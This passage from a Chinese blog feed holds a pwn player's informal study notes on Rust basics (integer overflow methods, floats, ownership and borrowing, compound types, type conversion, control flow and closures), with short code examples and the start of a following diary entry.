.</p><p>整形字面量可以用下表的形式书写：</p><table><thead><tr><th>数字字面量</th><th>示例</th></tr></thead><tbody><tr><td>十进制</td><td><code>98_222</code></td></tr><tr><td>十六进制</td><td><code>0xff</code></td></tr><tr><td>八进制</td><td><code>0o77</code></td></tr><tr><td>二进制</td><td><code>0b1111_0000</code></td></tr><tr><td>字节 (仅限于 <code>u8</code>)</td><td><code>b'A'</code></td></tr></tbody></table><blockquote><p>这个设计感觉是为了可读性设计的, 诸如我们现在看大数字的三位一分隔:</p><p>即 1000000 -&gt; 1_000_000 .</p></blockquote><h5 id="整数溢出">整数溢出 (?</h5><blockquote><p>原理在这里就不多写了, 毕竟笔者是做 pwn 的（</p></blockquote><p>有趣的点是, 在 rust 的 debug 模式下编译时会检测整数溢出, 如果存在这个问题就不过编译 (这个感觉挺有趣的) , 似乎如果是不在 debug 下编译的话会按照补码循环的方式 (其实就基本上是 c 的整数溢出处理方式) 去处理溢出, 并不会 panic .</p><p>但是 rust 中也给了一些显式处理溢出的办法:</p><ul><li>使用 <code>wrapping_*</code> 方法在所有模式下都按照补码循环溢出规则处理，例如 <code>wrapping_add</code></li><li>如果使用 <code>checked_*</code> 方法时发生溢出，则返回 <code>None</code> 值</li><li>使用 <code>overflowing_*</code> 方法返回该值和一个指示是否存在溢出的布尔值</li><li>使用 <code>saturating_*</code> 方法，可以限定计算后的结果不超过目标类型的最大值或低于最小值.</li></ul><p>自己演示了一下这几个方法:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> : <span class="hljs-type">u8</span> = <span class="hljs-number">251</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">b</span> = a.<span class="hljs-title function_ invoke__">saturating_add</span>(<span class="hljs-number">1</span><span class="hljs-comment">/*10*/</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;otto &#123;:?&#125;&quot;</span>,b);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面几个例子里面后面的 ‘*’ 指的都是运算, 实际结果在 <code>checked</code> 这里会有一点区别, 会返回一个 <code>Some(xxx)</code> , 除此之外写个代码调一下都比较好懂.</p><h5 id="浮点数">浮点数</h5><blockquote><p>这里看 rust 圣经的写法感觉 rust 还挺重视底层逻辑的（大概是这种想法</p></blockquote><p>默认浮点数类型是 <code>f64</code> .</p><p>在这里浮点数使用的时候会出现一些所谓 ‘陷阱’, 但是似乎就是二进制不能准确完美表达十进制数字所导致的一些陷阱, 于是结果就是在实际 rust 计算的时候, <code>0.1 + 0.2 != 0.3</code> 的样子.</p><h5 id="NaN">NaN</h5><p>对于数学上未定义的结果，例如对负数取平方根 <code>-42.1.sqrt()</code> ，会产生一个特殊的结果：Rust 的浮点数类型使用 <code>NaN</code> (not a number)来处理这些情况。</p><p><strong>所有跟 <code>NaN</code> 交互的操作，都会返回一个 <code>NaN</code></strong>，而且 <code>NaN</code> 不能用来比较.</p><p>这里还提到一个 <code>is_nan()</code> 的方法可以处理这种情况, 感觉就是返回 1 和 0 的区别, 有时间调一下(</p><h4 id="运算">运算</h4><p>运算和已知的那些运算是几乎等同的, 包括数字运算以及位运算, 但是也要求同类型, <s>懒得多写了</s>.</p><h4 id="序列-Range">序列 (Range)</h4><p>这个看样子是 rust 提供的一个简单的生成连续数值的方法, 方便应用于循环中. 举个例子:</p><ul><li><code>1..5</code> 生成不包括 5 的连续数字, 即 1-4</li><li><code>1..=5</code> 则会包括 5 .</li></ul><p>但是这种序列只允许应用于数字和字符中, 原因是它们可以连续, 同时编译器也可以进行检查.</p><h4 id="字符-char">字符 (char)</h4><p>在 rust 中的字符这个概念很有意思, 这里的字符不仅仅是 <code>ASCII</code> , 所有的 <code>unicode</code> 都可以当作字符, 包括但不限于中文汉字, 其他的神魔语言, 甚至是 ‘👴’.</p><p>正因为是 <code>Unicode</code> 的形式, rust 中的字符是占用 4 字节的.</p><p>但是字符只能用 <code>''</code> 表示, <code>&quot;&quot;</code> 是表示字符串时使用的.</p><h4 id="Others">Others</h4><p>rust 圣经中还有一个 bool 和一个单元类型, bool 不用多说.</p><p>单元类型的话笔者想摘抄一下圣经原文:</p><blockquote><p>单元类型就是 <code>()</code> ，对，你没看错，就是 <code>()</code> ，唯一的值也是 <code>()</code> ，一些读者读到这里可能就不愿意了，你也太敷衍了吧，管这叫类型？</p><p>只能说，再不起眼的东西，都有其用途，在目前为止的学习过程中，大家已经看到过很多次 <code>fn main()</code> 函数的使用吧？那么这个函数返回什么呢？</p><p>没错， <code>main</code> 函数就返回这个单元类型 <code>()</code>，你不能说 <code>main</code> 函数无返回值，因为没有返回值的函数在 Rust 中是有单独的定义的：<code>发散函数( diverge function )</code>，顾名思义，无法收敛的函数。</p><p>例如常见的 <code>println!()</code> 的返回值也是单元类型 <code>()</code>。</p><p>再比如，你可以用 <code>()</code> 作为 <code>map</code> 的值，表示我们不关注具体的值，只关注 <code>key</code>。 这种用法和 Go 语言的 <em><strong>struct{}</strong></em> 类似，可以作为一个值用来占位，但是完全<strong>不占用</strong>任何内存。</p><p>似乎在 rust 中很看重 ‘内存’ 以及其管理之类的一些概念（</p></blockquote><h4 id="语句-表达式">语句/表达式</h4><p>这两个概念在 rust 中分的很明确, 看起来也是很重要的两个概念.</p><p>大概看上去的区别就是, 语句是不返回一个值的, 而表达式是一定会返回值的, 所以在 rust 中, 包括去调用一个函数, 包括写一个常数, 有返回的值就是个表达式.</p><p>在比如函数返回值的表达式写法上 (或者是别的神魔东西) 有个要素就是不能有分号, 如果加了分号就会从表达式变成一条语句, 而不会返回值.</p><p>最后, 如果一个表达式不返回任何值的话, 会隐式返回一个单元类型 <code>()</code> .</p><h4 id="函数">函数</h4><p>已经 8 是很陌生的一个概念 🌶 .</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">add</span>(i: <span class="hljs-type">i32</span>, j: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>   i + j<br> &#125;<br></code></pre></td></tr></table></figure><p>就像这样, 在 rust 函数中, 函数名和变量名采用 <code>snake_case</code> 命名, 位置随意, 只要定义即可过编译的样子.</p><h5 id="参数">参数</h5><p>在 rust 函数中的每一个参数都需要标注出它的具体类型, 箭头后面标注返回值类型, 8 然就会报错.</p><h5 id="返回">返回</h5><p>正常来说 rust 函数的返回值是最后一条表达式的返回值, 同时也可以使用 <code>return</code> 提前返回.</p><h5 id="特殊返回">特殊返回</h5><p>比如无返回值 ‘()’ , 如上提到的, 如果函数不给返回值则会返回一个 ‘()’, 如果误写一个语句做函数结尾的话也会返回一个 ‘()’ , 这东西就是用来表示 ‘无返回值’ 这一概念的.</p><p>还有在上面摘过的 <code>diverge function</code> 这一概念, 原文的表述是永不返回的发散函数, 这是一个 ‘不会返回的函数’ 的概念, 和返回 ‘()’ 是完全不一样的.</p><h3 id="0x04-所有权-借用">0x04 所有权/借用</h3><p>学到这里的时候稍微查了一下, 对 rust 的介绍就是一种重视安全性的语言, 所以在开始看这个 ‘所有权’ 的概念的时候就觉得这种机制应该十有八九就是对安全性的一些实现了.</p><h4 id="所有权">所有权</h4><blockquote><p>引用一下原文, 顺便多了解一些计算机机制.</p></blockquote><p>所有的程序都必须和计算机内存打交道，如何从内存中申请空间来存放程序的运行内容，如何在不需要的时候释放这些空间，成了重中之重，也是所有编程语言设计的难点之一。在计算机语言不断演变过程中，出现了三种流派：</p><ul><li><strong>垃圾回收机制(GC)</strong>，在程序运行时不断寻找不再使用的内存，典型代表：Java、Go</li><li><strong>手动管理内存的分配和释放</strong>, 在程序中，通过函数调用的方式来申请和释放内存，典型代表：C++</li><li><strong>通过所有权来管理内存</strong>，编译器在编译时会根据一系列规则进行检查</li></ul><p>其中 Rust 选择了第三种，最妙的是，这种检查只发生在编译期，因此对于程序运行期，不会有任何性能上的损失。</p><p>先来看看一段来自 C 语言的糟糕代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a;          <span class="hljs-comment">// 变量a的作用域开始</span><br>    a = <span class="hljs-number">100</span>;<br>    <span class="hljs-type">char</span> *c = <span class="hljs-string">&quot;xyz&quot;</span>;   <span class="hljs-comment">// 变量c的作用域开始</span><br>    <span class="hljs-keyword">return</span> &amp;a;<br>&#125;                   <span class="hljs-comment">// 变量a和c的作用域结束</span><br></code></pre></td></tr></table></figure><p>这段代码虽然可以编译通过，但是其实非常糟糕，变量 <code>a</code> 和 <code>c</code> 都是局部变量，函数结束后将局部变量 <code>a</code> 的地址返回，但局部变量 <code>a</code> 存在栈中，在离开作用域后，<code>a</code> 所申请的栈上内存都会被系统回收，从而造成了 <code>悬空指针(Dangling Pointer)</code> 的问题。这是一个非常典型的内存安全问题，虽然编译可以通过，但是运行的时候会出现错误, 很多编程语言都存在。</p><p>再来看变量 <code>c</code>，<code>c</code> 的值是常量字符串，存储于常量区，可能这个函数我们只调用了一次，也可能我们不再会使用这个字符串，但 <code>&quot;xyz&quot;</code> 只有当整个程序结束后系统才能回收这片内存。</p><blockquote><p>笔者看着真是相当亲切啊（x, 在原文中接下来介绍了一大段堆栈, 但是笔者是做 pwn 的, 不多写了…</p></blockquote><h5 id="所有权规则">所有权规则</h5><p>接下来是有关所有权的<strong>规则</strong>:</p><ul><li>Rust 中每一个值都被一个变量所拥有，该变量被称为值的所有者</li><li>一个值同时只能被一个变量所拥有，或者说一个值只能拥有一个所有者</li><li>当所有者(变量)离开作用域范围时，这个值将被丢弃(drop)</li></ul><p>作用域这一概念在 rust 中和别的语言看上去区别不大, 不多赘述.</p><p>这里还介绍了 <code>String</code> 这个类型, 这个类型是动态分配的字符串, 和诸如 ‘otto’ 这种字符串字面值不一样, 字面值即类型为 <code>&amp;str</code> 的变量, 是不可变的, 而动态分配的一个目的就是为了可变.</p><h4 id="所有权操作">所有权操作</h4><p>先来看一段代码：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">y</span> = x;<br></code></pre></td></tr></table></figure><p>这段代码的操作涉及到的值是整型, 是存在栈上的, 在变量绑定时只需要值 copy 即可, 不需要所有权的转移.</p><p>但是如果涉及到了诸如 <code>String</code> 这种动态的, 存在堆上的类型, 就无法做到像上面那样的简单的值 copy . 在 rust 中, 这个复杂类型的存储是分为 ‘栈上的地址指针 (指向堆) + 长度 + 容量, 即类型本身’ 和 ‘堆上的真实数据’ 两者.</p><blockquote><p>实际上这个类型只是三个指针的组合, 这里是清晰概念的说法（</p></blockquote><p>例如:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![allow(unused)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">s1</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-keyword">let</span> <span class="hljs-variable">s2</span> = s1;<br><br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;, world!&quot;</span>, s1);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里如果为了性能考虑的话, 是不会采用值 copy 的形式将这一堆东西全都 copy 到 s2 的, 而是只 copy 了 <code>String</code> 类型的三个指针, 但是这样会不符合所有权规则, 堆上的那些数据就有了 s1 和 s2 两个所有者.</p><p>如果一个值拥有 2 个所有者, 那这种情况就和 heap overlapping 无限类似了, 这时候如果离开作用域就无异于 <code>double free</code> . 于是 rust 选择在 s1 赋予 s2 后马上 drop 掉 s1 , 此时 s1 失效, 所有权转移到 s2 .</p><blockquote><p>看上去感觉类似于指针这一概念的转移, 只不过用所有权这一概念感觉更有针对性, 强调一个变量是否存在动态分配要素.</p></blockquote><h4 id="引用-借用">引用/借用</h4><p>引用和 c 的引用没什么区别, 一样是 <code> let a = &amp;b</code> 的形式, 也要解引用使用.</p><p>同时在 rust 中, 引用也可以使用关键字 <code>ref</code> .</p><p>引用在默认情况下是不可变的, 如果想要使用可变引用需要在声明的时候就加入 <code>mut</code> , 同时引用的那个变量也需要是可变的, 可变引用是不可以引用不可变变量的.</p><p>同一作用域下, 特定的一个变量只能有一个可变引用:</p><p>这种限制的好处就是使 Rust 在编译期就避免数据竞争，数据竞争可由以下行为造成：</p><ul><li>两个或更多的指针同时访问同一数据</li><li>至少有一个指针被用来写入数据</li><li>没有同步数据访问的机制</li></ul><p>数据竞争会导致未定义行为，这种行为很可能超出我们的预期，难以在运行时追踪，并且难以诊断和修复。而 Rust 避免了这种情况的发生，因为它甚至不会编译存在数据竞争的代码！</p><p>很多时候可以通过加大括号的方式限制变量的作用域以至于防止这个问题, 默认情况下, 引用的作用域持续到最后一次使用 (大概是这个样子) , 同时, (大概是) 同一变量的作用域下不能同时出现一个可变引用和不可变引用.</p><p>这里 rust 编译器还有一点优化, 对于这种编译器优化行为，Rust 专门起了一个名字 —— <strong>Non-Lexical Lifetimes(NLL)</strong>，专门用于找到某个引用在作用域(<code>&#125;</code>)结束前就不再被使用的代码位置。</p><p>总的来说，借用规则如下：</p><ul><li>同一时刻, 你只能拥有要么一个可变引用, 要么任意多个不可变引用</li><li>引用必须总是有效的.</li></ul><p>这里原文还写出了 dangling 引用的概念, 由于 rust 编译器会处理这种潜在的 uaf , 所以不多赘述.</p><h3 id="0x05-复合类型">0x05 复合类型</h3><h4 id="字符串">字符串</h4><h5 id="切片">切片</h5><p>大概和其他语言的切片没什么区别, rust 中的切片是对集合的一个引用, 大概语法是 <code>&amp;xx[x..x]</code>, 在字符串这里, 切片就是对字符串一部分的引用.</p><p>在切片这里的索引应该是按照字节的形式来的.</p><h5 id="字符串-v2">字符串</h5><p>顾名思义，字符串是由字符组成的连续集合，但是在上一节中我们提到过，<strong>Rust 中的字符是 Unicode 类型，因此每个字符占据 4 个字节内存空间，但是在字符串中不一样，字符串是 UTF-8 编码，也就是字符串中的字符所占的字节数是变化的(1 - 4)</strong>，这样有助于大幅降低字符串所占用的内存空间。</p><p>Rust 在语言级别，只有一种字符串类型： <code>str</code>，它通常是以引用类型出现 <code>&amp;str</code>，也就是上文提到的字符串切片。虽然语言级别只有上述的 <code>str</code> 类型，但是在标准库里，还有多种不同用途的字符串类型，其中使用最广的即是 <code>String</code> 类型。</p><p><code>str</code> 类型是硬编码进可执行文件，也无法被修改，但是 <code>String</code> 则是一个可增长、可改变且具有所有权的 UTF-8 编码字符串，<strong>当 Rust 用户提到字符串时，往往指的就是 <code>String</code> 类型和 <code>&amp;str</code> 字符串切片类型，这两个类型都是 UTF-8 编码</strong>。</p><p>除了 <code>String</code> 类型的字符串，Rust 的标准库还提供了其他类型的字符串，例如 <code>OsString</code>， <code>OsStr</code>， <code>CsString</code> 和 <code>CsStr</code> 等，注意到这些名字都以 <code>String</code> 或者 <code>Str</code> 结尾了吗？它们分别对应的是具有所有权和被借用的变量。</p><h4 id="元组">元组</h4><p>元组是一个可以包含各种类型值的组合。元组使用括号 <code>()</code> 来构造（construct），而每个元组自身又是一个类型标记为 <code>(T1, T2, ...)</code> 的值，其中 <code>T1</code>、<code>T2</code> 是每个元素的类型。函数可以使用元组来返回多个值，因为元组可以拥有任意多个值。</p><h4 id="数组">数组</h4><p>数组就 <code>a : [类型; size]</code></p><h4 id="结构体">结构体</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>    name: <span class="hljs-type">String</span>,<br>    age: <span class="hljs-type">u8</span>,<br>&#125;<br><br><span class="hljs-comment">// 单元结构体</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Unit</span>;<br><br><span class="hljs-comment">// 元组结构体</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Pair</span>(<span class="hljs-type">i32</span>, <span class="hljs-type">f32</span>);<br><br><span class="hljs-comment">// 带有两个字段的结构体</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span> &#123;<br>    x: <span class="hljs-type">f32</span>,<br>    y: <span class="hljs-type">f32</span>,<br>&#125;<br><br><span class="hljs-comment">// 结构体可以作为另一个结构体的字段</span><br><span class="hljs-meta">#[allow(dead_code)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Rectangle</span> &#123;<br>    <span class="hljs-comment">// 可以在空间中给定左上角和右下角在空间中的位置来指定矩形。</span><br>    top_left: Point,<br>    bottom_right: Point,<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="枚举">枚举</h4><p><code>enum</code> 关键字允许创建一个从数个不同取值中选其一的枚举类型（enumeration）。任何一个在 <code>struct</code> 中合法的取值在 <code>enum</code> 中也合法。</p><p>相较于结构体来说, 枚举可以不是同一个类型</p><hr><blockquote><p>从这里开始属于一个抓进度的状态, 速学了, 不写太多了（</p></blockquote><h4 id="Others-v2">Others</h4><p>这里应该是一些琐碎的东西.</p><h5 id="Option-Some">Option/Some</h5><p>在 Rust 中，<code>Option</code> 是一个枚举类型，用于表示一个值可能存在或不存在的情况。它有两个变体：</p><ol><li><code>Some(T)</code>：表示一个值存在，其中 <code>T</code> 是值的类型。</li><li><code>None</code>：表示值不存在。</li></ol><h3 id="0x06-类型转换">0x06 类型转换</h3><p>Rust 使用 <a href="https://rustwiki.org/zh-CN/rust-by-example/trait.html">trait</a> 解决类型之间的转换问题。最一般的转换会用到 <a href="https://rustwiki.org/zh-CN/std/convert/trait.From.html"><code>From</code></a> 和 <a href="https://rustwiki.org/zh-CN/std/convert/trait.Into.html"><code>Into</code></a> 两个 trait。</p><h4 id="From-Into">From / Into</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::convert::<span class="hljs-built_in">From</span>;<br><br><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Number</span> &#123;<br>    value: <span class="hljs-type">i32</span>,<br>&#125;<br><br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">From</span>&lt;<span class="hljs-type">i32</span>&gt; <span class="hljs-keyword">for</span> <span class="hljs-title class_">Number</span> &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from</span>(item: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> &#123;<br>        Number &#123; value: item &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">num</span> = Number::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;My number is &#123;:?&#125;&quot;</span>, num);<br>&#125;<br></code></pre></td></tr></table></figure><p>两者用法如上, 大体基本相同, 只不过在用 Into 的时候要在绑定的时候指定类型:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">int</span> = <span class="hljs-number">5</span>;<br>    <span class="hljs-comment">// 试试删除类型说明</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">num</span>: Number = int.<span class="hljs-title function_ invoke__">into</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;My number is &#123;:?&#125;&quot;</span>, num);<br>&#125;<br></code></pre></td></tr></table></figure><p>类似于 <a href="https://rustwiki.org/zh-CN/rust-by-example/conversion/from_into.html"><code>From</code> 和 <code>Into</code></a>，<a href="https://rustwiki.org/zh-CN/std/convert/trait.TryFrom.html"><code>TryFrom</code></a> 和 <a href="https://rustwiki.org/zh-CN/std/convert/trait.TryInto.html"><code>TryInto</code></a> 是类型转换的通用 trait。不同于 <code>From</code>/<code>Into</code> 的是，<code>TryFrom</code> 和 <code>TryInto</code> trait 用于易出错的转换，也正因如此，其返回值是 <a href="https://rustwiki.org/zh-CN/std/result/enum.Result.html"><code>Result</code></a> 型。</p><p>要把任何类型转换成 <code>String</code>，只需要实现那个类型的 <a href="https://rustwiki.org/zh-CN/std/string/trait.ToString.html"><code>ToString</code></a> trait。然而不要直接这么做，您应该实现<a href="https://rustwiki.org/zh-CN/std/fmt/trait.Display.html"><code>fmt::Display</code></a> trait，它会自动提供 <a href="https://rustwiki.org/zh-CN/std/string/trait.ToString.html"><code>ToString</code></a>.</p><blockquote><p>rust-by-example 前面一段对 trait 的描写真多啊（</p></blockquote><p>我们经常需要把字符串转成数字。完成这项工作的标准手段是用 <a href="https://rustwiki.org/zh-CN/std/primitive.str.html#method.parse"><code>parse</code></a> 函数, 这里需要提供类型, 方法是提供标注或 <code>parse::&lt;xx&gt;()</code> .</p><p>多在这里写一个 str 到 String 的转换:</p><ul><li><code>String::from(&quot;hello,world&quot;)</code></li><li><code>&quot;hello,world&quot;.to_string()</code></li></ul><h3 id="0x07-流程控制">0x07 流程控制</h3><h4 id="if-else">if else</h4><p><code>if</code>-<code>else</code> 分支判断和其他语言类似。不同的是，Rust 语言中的布尔判断条件不必使用小括号包裹，且每个条件后面都跟着一个代码块。<code>if</code>-<code>else</code> 条件选择是一个表达式，并且所有分支都必须返回相同的类型。</p><h4 id="无限循环-loop">无限循环 (loop)</h4><p>使用 loop 构建一个无限循环, 可以通过 break 直接退出循环, 或是 continue 继续下一次.</p><h5 id="嵌套处理">嵌套处理</h5><p>在处理嵌套循环的时候可以 <code>break</code> 或 <code>continue</code> 外层循环。在这类情形中，循环必须用一些 <code>'label</code>（标签）来注明，并且标签必须传递给 <code>break</code>/<code>continue</code> 语句. 如下:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-symbol">&#x27;outer</span>: <span class="hljs-keyword">loop</span> &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Entered the outer loop&quot;</span>);<br><br>        <span class="hljs-symbol">&#x27;inner</span>: <span class="hljs-keyword">loop</span> &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Entered the inner loop&quot;</span>);<br><br>            <span class="hljs-comment">// 这只是中断内部的循环</span><br>            <span class="hljs-comment">//break;</span><br><br>            <span class="hljs-comment">// 这会中断外层循环</span><br>            <span class="hljs-keyword">break</span> <span class="hljs-symbol">&#x27;outer</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;This point will never be reached&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Exited the outer loop&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>loop</code> 有个用途是尝试一个操作直到成功为止。若操作返回一个值，则可能需要将其传递给代码的其余部分：将该值放在 <code>break</code> 之后，它就会被 <code>loop</code> 表达式返回。</p><h4 id="WHile">WHile</h4><p><code>while</code> 关键字可以用作当型循环（当条件满足时循环）, 用法类似, 不多写.</p><h4 id="For">For</h4><p><code>for in</code> 结构可以遍历一个 <code>Iterator</code>（迭代器）。创建迭代器的一个最简单的方法是使用区间标记 <code>a..b</code>。这会生成从 <code>a</code>（包含此值） 到 <code>b</code>（不含此值）的，步长为 1 的一系列值。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">n</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;q&#x27;</span> &#123;<br>        <span class="hljs-keyword">if</span> n == <span class="hljs-string">&#x27;c&#x27;</span> &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;otto&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;0770&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>for in</code> 结构能以几种方式与 <code>Iterator</code> 互动。在 <a href="https://rustwiki.org/zh-CN/rust-by-example/trait/iter.html">迭代器</a> trait 一节将会谈到，<strong>如果没有特别指定，<code>for</code> 循环会对给出的集合应用 <code>into_iter</code> 函数</strong>，把它转换成一个迭代器。这并不是把集合变成迭代器的唯一方法，其他的方法有 <code>iter</code> 和<code>iter_mut</code> 函数。</p><p>这三个函数会以不同的方式返回集合中的数据。</p><ul><li><code>iter</code> - 在每次迭代中借用集合中的一个元素。这样集合本身不会被改变，循环之后仍可以使用。</li><li><code>into_iter</code> - 会消耗集合。在每次迭代中，集合中的数据本身会被提供。一旦集合被消耗了，之后就无法再使用了，因为它已经在循环中被 “移除”（move）了。</li><li><code>iter_mut</code> - 可变地（mutably）借用集合中的每个元素，从而允许集合被就地修改。</li></ul><h4 id="match-匹配机制">match 匹配机制</h4><p>Rust 通过 <code>match</code> 关键字来提供模式匹配，和 C 语言的 <code>switch</code> 用法类似。第一个匹配分支会被比对，并且所有可能的值都必须被覆盖, 这个机制也可以用于解构一些复杂类型变量, 诸如一个元组我只需要 match 第一个元素, 然后对后续元素进行操作的这种情况.</p><p>由于在这里需要覆盖所有可能的值, 所以有的时候可能某些语句会比较多余, 这时候 rust 也提供了 <code>if let</code> 和 <code>while let</code> 机制,</p><h3 id="0x08-有关函数">0x08 有关函数</h3><h4 id="方法">方法</h4><p>方法（method）是依附于对象的函数。这些方法通过关键字 <code>self</code> 来访问对象中的数据和其他。方法在 <code>impl</code> 代码块中定义。</p><h4 id="闭包">闭包</h4><p>Rust 中的闭包（closure），也叫做 lambda 表达式或者 lambda，是一类能够捕获周围作用域中变量的函数。例如，一个可以捕获 x 变量的闭包如下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Rust">|val| val + x<br></code></pre></td></tr></table></figure><p>它们的语法和能力使它们在临时（on the fly）使用时相当方便。调用一个闭包和调用一个函数完全相同，不过调用闭包时，输入和返回类型两者都<strong>可以</strong>自动推导，而输入变量名<strong>必须</strong>指明。</p><p>其他的特点包括：</p><ul><li>声明时使用 <code>||</code> 替代 <code>()</code> 将输入参数括起来。</li><li>函数体定界符（<code>&#123;&#125;</code>）对于单个表达式是可选的，其他情况必须加上。</li><li>有能力捕获外部环境的变量。</li></ul>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
      <category>Rust</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024diary</title>
    <link href="/2024/01/08/2024diary/"/>
    <url>/2024/01/08/2024diary/</url>
    
